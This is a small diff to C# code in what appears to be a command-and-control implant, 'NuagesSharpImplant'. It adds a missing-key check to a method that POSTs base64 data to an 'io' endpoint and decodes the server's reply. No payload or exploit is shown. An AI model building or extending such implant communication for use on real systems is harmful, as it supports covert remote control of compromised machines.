@@ -67,7 +67,11 @@ namespace NuagesSharpImplant.Connections
                         list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(input)));
                         JsonObject body = new JsonObject(list);
                         JsonValue response = JsonValue.Parse(connection.POST("io", body.ToString()));
-                        return Convert.FromBase64String(response["out"]);
+                        if (response.ContainsKey("out"))
+                        {
+                            return Convert.FromBase64String(response["out"]);
+                        }
+                        return new Byte[0];
                     }
 
                 }
